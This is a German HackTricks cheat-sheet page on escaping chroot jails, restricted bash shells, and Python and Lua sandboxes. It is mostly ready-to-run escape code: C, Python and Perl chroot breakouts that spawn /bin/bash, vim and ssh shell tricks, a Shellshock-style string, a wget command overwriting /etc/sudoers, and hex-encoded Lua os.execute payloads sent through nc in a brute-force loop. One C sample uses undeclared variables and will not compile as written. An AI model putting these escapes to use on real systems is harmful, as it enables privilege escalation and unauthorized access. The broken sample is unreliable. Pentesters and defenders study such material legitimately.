# Entkommen aus Gefängnissen

{% hint style="success" %}
Lernen Sie & üben Sie AWS-Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen Sie & üben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github Repositories einreichen.

</details>
{% endhint %}

## **GTFOBins**

**Suchen Sie in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **nach Binärdateien mit der Eigenschaft "Shell", die ausgeführt werden können**

## Chroot-Eskapaden

Von [Wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Der Chroot-Mechanismus ist **nicht dazu gedacht**, sich gegen vorsätzliche Manipulationen durch **privilegierte** (**Root**) **Benutzer** zu verteidigen. Auf den meisten Systemen stapeln sich Chroot-Kontexte nicht ordnungsgemäß, und gechrootete Programme **mit ausreichenden Berechtigungen können einen zweiten Chroot durchführen, um auszubrechen**.\
Normalerweise bedeutet dies, dass Sie root innerhalb des Chroots sein müssen, um zu entkommen.

{% hint style="success" %}
Das **Tool** [**chw00t**](https://github.com/earthquake/chw00t) wurde erstellt, um die folgenden Szenarien zu missbrauchen und aus `chroot` zu entkommen.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Wenn Sie als **Root** innerhalb eines Chroots sind, können Sie entkommen, indem Sie einen **weiteren Chroot** erstellen. Dies liegt daran, dass 2 Chroots (in Linux) nicht gleichzeitig existieren können. Wenn Sie also einen Ordner erstellen und dann einen **neuen Chroot** in diesem neuen Ordner erstellen, während Sie **außerhalb davon sind**, werden Sie jetzt **außerhalb des neuen Chroots** sein und somit im Dateisystem.

Dies geschieht, weil Chroot normalerweise Ihr Arbeitsverzeichnis nicht in das angegebene verschiebt, sodass Sie einen Chroot erstellen können, aber außerhalb davon sein können.
{% endhint %}

Normalerweise finden Sie die `chroot`-Binärdatei nicht innerhalb eines Chroot-Gefängnisses, aber Sie **könnten eine Binärdatei kompilieren, hochladen und ausführen**:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Gespeicherter fd

{% hint style="warning" %}
Dies ist ähnlich wie im vorherigen Fall, aber in diesem Fall speichert der **Angreifer einen Dateideskriptor für das aktuelle Verzeichnis** und erstellt dann **das Chroot in einem neuen Ordner**. Schließlich, da er **Zugriff** auf diesen **FD** **außerhalb** des Chroots hat, greift er darauf zu und **entkommt**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FD kann über Unix-Domänen-Sockets übergeben werden, also:

* Erstellen eines Kindprozesses (fork)
* Erstellen von UDS, damit Eltern und Kind kommunizieren können
* Führen von chroot im Kindprozess in einem anderen Ordner aus
* Im Elternprozess einen FD eines Ordners erstellen, der außerhalb des neuen Kindprozess-Chroots liegt
* Den FD an das Kindprozess über die UDS übergeben
* Kindprozess wechselt zu diesem FD und da er außerhalb seines Chroots liegt, wird er dem Gefängnis entkommen
{% endhint %}

### Root + Mount

{% hint style="warning" %}
* Einhängen des Root-Geräts (/) in ein Verzeichnis innerhalb des Chroots
* Chrooten in dieses Verzeichnis

Dies ist in Linux möglich
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Procfs in ein Verzeichnis innerhalb des Chroots einhängen (falls noch nicht geschehen)
* Nach einer PID suchen, die einen anderen Root/CWD-Eintrag hat, z. B.: /proc/1/root
* In diesen Eintrag chrooten
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Erstellen eines Forks (Kindprozess) und chrooten in einen anderen Ordner weiter unten im Dateisystem und darauf wechseln
* Vom Elternprozess aus den Ordner, in dem sich der Kindprozess befindet, in einen Ordner vor dem Chroot der Kinder verschieben
* Dieser Kindprozess wird sich außerhalb des Chroots befinden
{% endhint %}

### ptrace

{% hint style="warning" %}
* Früher konnten Benutzer ihre eigenen Prozesse von einem Prozess aus selbst debuggen... aber das ist standardmäßig nicht mehr möglich
* Trotzdem, wenn es möglich ist, könnten Sie in einen Prozess ptracen und einen Shellcode darin ausführen ([siehe dieses Beispiel](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Bash-Gefängnisse

### Enumeration

Informationen über das Gefängnis erhalten:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Ändern des PATH

Überprüfen Sie, ob Sie die PATH-Umgebungsvariable ändern können
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Mit vim verwenden
```bash
:set shell=/bin/sh
:shell
```
### Skript erstellen

Überprüfen, ob Sie eine ausführbare Datei mit _/bin/bash_ als Inhalt erstellen können
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Erhalte bash von SSH

Wenn Sie über SSH zugreifen, können Sie diesen Trick verwenden, um eine Bash-Shell auszuführen:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Deklarieren
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Sie können beispielsweise die sudoers-Datei überschreiben
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Andere Tricks

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**Es könnte auch interessant sein die Seite:**

{% content-ref url="../bypass-bash-restrictions/" %}
[bypass-bash-restrictions](../bypass-bash-restrictions/)
{% endcontent-ref %}

## Python Gefängnisse

Tricks zum Entkommen aus Python-Gefängnissen auf der folgenden Seite:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua Gefängnisse

Auf dieser Seite finden Sie die globalen Funktionen, auf die Sie in Lua zugreifen können: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Eval mit Befehlsausführung:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Einige Tricks, um **Funktionen einer Bibliothek ohne Verwendung von Punkten aufzurufen**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Liste Funktionen einer Bibliothek auf:
```bash
for k,v in pairs(string) do print(k,v) end
```
Beachten Sie, dass jedes Mal, wenn Sie den vorherigen Einzeiler in einer **anderen Lua-Umgebung ausführen, die Reihenfolge der Funktionen geändert wird**. Wenn Sie also eine bestimmte Funktion ausführen müssen, können Sie einen Brute-Force-Angriff durchführen, indem Sie verschiedene Lua-Umgebungen laden und die erste Funktion der le-Bibliothek aufrufen:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Interaktive Lua-Shell erhalten**: Wenn Sie sich in einer begrenzten Lua-Shell befinden, können Sie eine neue Lua-Shell (und hoffentlich unbegrenzt) aufrufen, indem Sie Folgendes eingeben:
```bash
debug.debug()
```
## Referenzen

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Folien: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

{% hint style="success" %}
Lernen & üben Sie AWS-Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositorys senden.

</details>
{% endhint %}
